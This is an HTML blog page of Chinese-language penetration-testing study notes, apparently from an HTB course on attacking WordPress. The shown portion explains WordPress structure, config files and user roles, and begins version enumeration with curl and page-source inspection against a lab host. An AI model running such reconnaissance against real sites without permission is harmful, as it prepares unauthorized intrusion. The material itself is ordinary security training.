@@ -1,0 +1,604 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HackingWordPressHTB | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="IntroWordPress OverviewWordPress是最受欢迎的开源内容管理系统（CMS），为全球近三分之一的网站提供支持。它可以用于多种目的，例如托管博客，论坛，电子商务，项目管理，文档管理等等。WordPress是高度可定制的，并且SEO友好，这使得它在公司中很受欢迎。它有一个大型的扩展库，称为主题和插件，免费和付费，可以添加以增强网站。插件的一些例子是WPForms，一个强大的联">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackingWordPressHTB">
+<meta property="og:url" content="http://mikannse.space/2023/10/24/HackingWordPressHTB/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="IntroWordPress OverviewWordPress是最受欢迎的开源内容管理系统（CMS），为全球近三分之一的网站提供支持。它可以用于多种目的，例如托管博客，论坛，电子商务，项目管理，文档管理等等。WordPress是高度可定制的，并且SEO友好，这使得它在公司中很受欢迎。它有一个大型的扩展库，称为主题和插件，免费和付费，可以添加以增强网站。插件的一些例子是WPForms，一个强大的联">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2023-10-24T15:20:30.000Z">
+<meta property="article:modified_time" content="2023-10-25T02:50:08.222Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="网安">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2023/10/24/HackingWordPressHTB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HackingWordPressHTB',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2023-10-25 10:50:08'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HackingWordPressHTB</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-24T15:20:30.000Z" title="发表于 2023-10-24 23:20:30">2023-10-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-25T02:50:08.222Z" title="更新于 2023-10-25 10:50:08">2023-10-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>36分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HackingWordPressHTB"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><h2 id="WordPress-Overview"><a href="#WordPress-Overview" class="headerlink" title="WordPress Overview"></a>WordPress Overview</h2><p><a target="_blank" rel="noopener" href="https://wordpress.org/">WordPress</a>是最受欢迎的开源内容管理系统（CMS），为全球近三分之一的网站提供支持。它可以用于多种目的，例如托管博客，论坛，电子商务，项目管理，文档管理等等。WordPress是高度可定制的，并且SEO友好，这使得它在公司中很受欢迎。它有一个大型的扩展库，称为主题和插件，免费和付费，可以添加以增强网站。插件的一些例子是WPForms，一个强大的联系表单，与Google Analytics接口的MonsterInsights，以及Constant  Contact，一个流行的电子邮件营销服务。然而，它的可定制性和可扩展性使其容易通过第三方主题和插件而受到攻击。WordPress是用PHP编写的，通常运行在Apache上，MySQL作为后端。许多托管公司在创建新网站时提供WordPress作为选项，甚至帮助完成安全更新等后端任务。</p>
+<p>本模块将涵盖WordPress网站的核心结构，手动和自动枚举技术，以发现错误配置和漏洞，并通过一些常见的攻击。您将有机会执行自己的枚举和攻击WordPress实例，同时通过每个部分中的材料工作。该模块将以技能评估结束，以将您所学的一切结合在一起，并完成所有必要的步骤，以完全妥协WordPress网站和底层Web服务器。</p>
+<p>快乐的黑客，不要忘记跳出框框思考！</p>
+<h3 id="什么是CMS？"><a href="#什么是CMS？" class="headerlink" title="什么是CMS？"></a>什么是CMS？</h3><p>CMS是一个强大的工具，可以帮助构建一个网站，而无需从头开始编写代码（甚至根本不知道如何编写代码）。CMS在基础设施方面做了大部分的“繁重工作”，更多地关注网站的设计和演示方面，而不是后端结构。大多数CMS提供了一个丰富的所见即所得 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/WYSIWYG">(WYSIWYG)</a>编辑器，用户可以编辑内容，就像他们在文字处理工具（如Microsoft Word）中工作一样。用户可以直接从媒体库界面上传媒体，而无需从管理门户或通过FTP或SFTP与Web服务器交互。</p>
+<p>由两个关键组件组成：</p>
+<ul>
+<li>内容管理应用程序（CMA）-用于添加和管理内容的界面。</li>
+<li>内容交付应用程序（CDA）-后端，它接受输入到CMA的输入，并将代码组装成一个工作的、视觉上吸引人的网站。</li>
+</ul>
+<p>一个好的CMS将提供可扩展性，允许您添加功能和设计元素到网站，而无需使用网站代码，丰富的用户管理，以提供对访问权限和角色的细粒度控制，媒体管理，以允许用户轻松上传和嵌入照片和视频，以及适当的版本控制。在寻找CMS时，我们还应该确认它维护良好，定期更新和升级，并具有足够的内置安全设置来加强网站免受攻击。</p>
+<h2 id="WordPress-Structure"><a href="#WordPress-Structure" class="headerlink" title="WordPress Structure"></a>WordPress Structure</h2><h3 id="默认WordPress文件结构"><a href="#默认WordPress文件结构" class="headerlink" title="默认WordPress文件结构"></a>默认WordPress文件结构</h3><p>WordPress可以安装在Windows、Linux或Mac OSX主机上。在本模块中，我们将重点介绍Ubuntu Linux  Web服务器上的默认WordPress安装。WordPress在安装到Linux主机上之前需要完全安装和配置LAMP堆栈（Linux操作系统、Apache HTTP Server、MySQL数据库和PHP编程语言）。安装后，所有WordPress支持文件和目录将在位于<code>/var/www/html</code>的webroot中访问。</p>
+<p>下面是默认WordPress安装的目录结构，显示了网站正常运行所需的关键文件和子目录。</p>
+<h4 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h4><p>​                                                                                File Structure文件结构                </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ tree -L 1 /var/www/html</span><br><span class="line">.</span><br><span class="line">├── index.php</span><br><span class="line">├── license.txt</span><br><span class="line">├── readme.html</span><br><span class="line">├── wp-activate.php</span><br><span class="line">├── wp-admin</span><br><span class="line">├── wp-blog-header.php</span><br><span class="line">├── wp-comments-post.php</span><br><span class="line">├── wp-config.php</span><br><span class="line">├── wp-config-sample.php</span><br><span class="line">├── wp-content</span><br><span class="line">├── wp-cron.php</span><br><span class="line">├── wp-includes</span><br><span class="line">├── wp-links-opml.php</span><br><span class="line">├── wp-load.php</span><br><span class="line">├── wp-login.php</span><br><span class="line">├── wp-mail.php</span><br><span class="line">├── wp-settings.php</span><br><span class="line">├── wp-signup.php</span><br><span class="line">├── wp-trackback.php</span><br><span class="line">└── xmlrpc.php</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="关键WordPress文件"><a href="#关键WordPress文件" class="headerlink" title="关键WordPress文件"></a>关键WordPress文件</h3><p>WordPress的根目录包含配置WordPress以正确运行所需的文件。</p>
+<ul>
+<li><code>index.php</code>是WordPress的主页。</li>
+<li><code>license.txt</code>包含有用的信息，例如WordPress安装的版本。</li>
+<li><code>wp-activate.php</code>用于设置新WordPress站点时的电子邮件激活过程。</li>
+<li><code>wp-admin</code>文件夹包含管理员访问的登录页面和后端仪表板。用户登录后，可以根据分配给他们的权限对站点进行更改。登录页面可以位于以下路径之一：<ul>
+<li><code>/wp-admin/login.php</code></li>
+<li><code>/wp-admin/wp-login.php</code></li>
+<li><code>/login.php</code></li>
+<li><code>/wp-login.php</code></li>
+</ul>
+</li>
+</ul>
+<p>也可以重命名此文件以使查找登录页面更有挑战性。</p>
+<ul>
+<li><code>xmlrpc.php</code>是表示WordPress的特征的文件，该特征使得能够使用HTTP作为传输机制和XML作为编码机制来传输数据。这种类型的通信已被WordPress<a target="_blank" rel="noopener" href="https://developer.wordpress.org/rest-api/reference">REST API</a>取代。</li>
+</ul>
+<h3 id="WordPress配置文件"><a href="#WordPress配置文件" class="headerlink" title="WordPress配置文件"></a>WordPress配置文件</h3><ul>
+<li><code>wp-config.php</code>文件包含WordPress连接到数据库所需的信息，例如数据库名称、数据库主机、用户名和密码、身份验证密钥和salt以及数据库表前缀。此配置文件还可用于激活调试模式，这在故障排除中很有用。</li>
+</ul>
+<h4 id="wp-config-php"><a href="#wp-config-php" class="headerlink" title="wp-config.php"></a>wp-config.php</h4><p>Code: </p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/** &lt;SNIP&gt; */</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">'DB_NAME'</span>, <span class="string">'database_name_here'</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">'DB_USER'</span>, <span class="string">'username_here'</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">'DB_PASSWORD'</span>, <span class="string">'password_here'</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">'DB_HOST'</span>, <span class="string">'localhost'</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Authentication Unique Keys and Salts */</span></span><br><span class="line"><span class="comment">/* &lt;SNIP&gt; */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">'AUTH_KEY'</span>,         <span class="string">'put your unique phrase here'</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">'SECURE_AUTH_KEY'</span>,  <span class="string">'put your unique phrase here'</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">'LOGGED_IN_KEY'</span>,    <span class="string">'put your unique phrase here'</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">'NONCE_KEY'</span>,        <span class="string">'put your unique phrase here'</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">'AUTH_SALT'</span>,        <span class="string">'put your unique phrase here'</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">'SECURE_AUTH_SALT'</span>, <span class="string">'put your unique phrase here'</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">'LOGGED_IN_SALT'</span>,   <span class="string">'put your unique phrase here'</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">'NONCE_SALT'</span>,       <span class="string">'put your unique phrase here'</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** WordPress Database Table prefix */</span></span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">'wp_'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** For developers: WordPress debugging mode. */</span></span><br><span class="line"><span class="comment">/** &lt;SNIP&gt; */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">'WP_DEBUG'</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="title function_ invoke__">defined</span>( <span class="string">'ABSPATH'</span> ) ) {</span><br><span class="line">	<span class="title function_ invoke__">define</span>( <span class="string">'ABSPATH'</span>, <span class="keyword">__DIR__</span> . <span class="string">'/'</span> );</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="keyword">require_once</span> ABSPATH . <span class="string">'wp-settings.php'</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="关键的WordPress目录"><a href="#关键的WordPress目录" class="headerlink" title="关键的WordPress目录"></a>关键的WordPress目录</h3><ul>
+<li><code>wp-content</code>文件夹是存储插件和主题的主目录。子目录<code>uploads/</code>通常是存储上传到平台的任何文件的地方。应仔细枚举这些目录和文件，因为它们可能包含敏感数据，从而导致远程代码执行或利用其他漏洞或错误配置。</li>
+</ul>
+<h4 id="WP-Content"><a href="#WP-Content" class="headerlink" title="WP-Content"></a>WP-Content</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ tree -L 1 /var/www/html/wp-content</span><br><span class="line">.</span><br><span class="line">├── index.php</span><br><span class="line">├── plugins</span><br><span class="line">└── themes</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><code>wp-includes</code>包含除管理组件和属于网站的主题之外的所有内容。这是存储核心文件（如证书、字体、JavaScript文件和小部件）的目录。</li>
+</ul>
+<h4 id="WP-Includes"><a href="#WP-Includes" class="headerlink" title="WP-Includes"></a>WP-Includes</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ tree -L 1 /var/www/html/wp-includes</span><br><span class="line">.</span><br><span class="line">├── &lt;SNIP&gt;</span><br><span class="line">├── theme.php</span><br><span class="line">├── update.php</span><br><span class="line">├── user.php</span><br><span class="line">├── vars.php</span><br><span class="line">├── version.php</span><br><span class="line">├── widgets</span><br><span class="line">├── widgets.php</span><br><span class="line">├── wlwmanifest.xml</span><br><span class="line">├── wp-db.php</span><br><span class="line">└── wp-diff.php</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="WordPress用户角色"><a href="#WordPress用户角色" class="headerlink" title="WordPress用户角色"></a>WordPress用户角色</h2><p>在标准的WordPress安装中有五种类型的用户。</p>
+<table>
+<thead>
+<tr>
+<th>Role作用</th>
+<th>Description描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Administrator</td>
+<td>此用户可以访问网站内的管理功能。这包括添加和删除用户和帖子，以及编辑源代码。</td>
+</tr>
+<tr>
+<td>Editor</td>
+<td>An editor can publish and manage posts, including the posts of other users.编辑器可以发布和管理帖子，包括其他用户的帖子。</td>
+</tr>
+<tr>
+<td>Author</td>
+<td>作者可以发布和管理自己的帖子。</td>
+</tr>
+<tr>
+<td>Contributor</td>
+<td>这些用户可以编写和管理自己的帖子，但不能发布它们。</td>
+</tr>
+<tr>
+<td>Subscriber</td>
+<td>这些是普通用户，他们可以浏览帖子并编辑个人资料。</td>
+</tr>
+</tbody></table>
+<p>通常需要以管理员身份获得访问权限，才能在服务器上执行代码。但是，编辑和作者可能可以访问普通用户无法访问的某些易受攻击的插件。</p>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="WordPress核心版本枚举"><a href="#WordPress核心版本枚举" class="headerlink" title="WordPress核心版本枚举"></a>WordPress核心版本枚举</h2><p>了解我们正在使用的应用程序类型始终很重要。枚举阶段的一个重要部分是发现软件版本号。这在搜索常见的错误配置（例如可能为应用程序的某些版本设置的默认密码）以及搜索特定版本号的已知漏洞时很有帮助。我们可以使用多种方法手动发现版本号。第一步也是最简单的一步是查看页面源代码。我们可以通过右键单击当前页面上的任何位置，然后从菜单中选择“查看页面源”或使用键盘快捷键<code>[CTRL + U]</code>来完成此操作。</p>
+<p>我们可以在浏览器中使用快捷方式<code>meta generator</code>搜索<code>[CTRL + F]</code>标记，或者在命令行中使用<code>cURL</code>沿着<code>grep</code>来过滤此信息。</p>
+<h4 id="WP版本-源代码"><a href="#WP版本-源代码" class="headerlink" title="WP版本-源代码"></a>WP版本-源代码</h4><p>Code: </p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">...SNIP...</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'https://api.w.org/'</span> <span class="attr">href</span>=<span class="string">'http://blog.inlanefreight.com/index.php/wp-json/'</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"EditURI"</span> <span class="attr">type</span>=<span class="string">"application/rsd+xml"</span> <span class="attr">title</span>=<span class="string">"RSD"</span> <span class="attr">href</span>=<span class="string">"http://blog.inlanefreight.com/xmlrpc.php?rsd"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"wlwmanifest"</span> <span class="attr">type</span>=<span class="string">"application/wlwmanifest+xml"</span> <span class="attr">href</span>=<span class="string">"http://blog.inlanefreight.com/wp-includes/wlwmanifest.xml"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"generator"</span> <span class="attr">content</span>=<span class="string">"WordPress 5.3.3"</span> /&gt;</span></span><br><span class="line">...SNIP...</span><br></pre></td></tr></tbody></table></figure>
+
+<p>WP版本-源代码                </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | grep '&lt;meta name="generator"'</span><br><span class="line"></span><br><span class="line">&lt;meta name="generator" content="WordPress 5.3.3" /&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>除了版本信息，源代码还可能包含有用的注释。CSS（样式表）和JS（JavaScript）的链接也可以提供有关版本号的提示。</p>
+<h4 id="WP-Version-CSS"><a href="#WP-Version-CSS" class="headerlink" title="WP Version - CSS"></a>WP Version - CSS</h4><p>Code: </p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">...SNIP...</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'stylesheet'</span> <span class="attr">id</span>=<span class="string">'bootstrap-css'</span>  <span class="attr">href</span>=<span class="string">'http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3'</span> <span class="attr">type</span>=<span class="string">'text/css'</span> <span class="attr">media</span>=<span class="string">'all'</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'stylesheet'</span> <span class="attr">id</span>=<span class="string">'transportex-style-css'</span>  <span class="attr">href</span>=<span class="string">'http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3'</span> <span class="attr">type</span>=<span class="string">'text/css'</span> <span class="attr">media</span>=<span class="string">'all'</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'stylesheet'</span> <span class="attr">id</span>=<span class="string">'transportex_color-css'</span>  <span class="attr">href</span>=<span class="string">'http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3'</span> <span class="attr">type</span>=<span class="string">'text/css'</span> <span class="attr">media</span>=<span class="string">'all'</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'stylesheet'</span> <span class="attr">id</span>=<span class="string">'smartmenus-css'</span>  <span class="attr">href</span>=<span class="string">'http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3'</span> <span class="attr">type</span>=<span class="string">'text/css'</span> <span class="attr">media</span>=<span class="string">'all'</span> /&gt;</span></span><br><span class="line">...SNIP...</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="WP-Version-JS-WP版本-JS"><a href="#WP-Version-JS-WP版本-JS" class="headerlink" title="WP Version - JS WP版本- JS"></a>WP Version - JS WP版本- JS</h4><p>Code: </p>
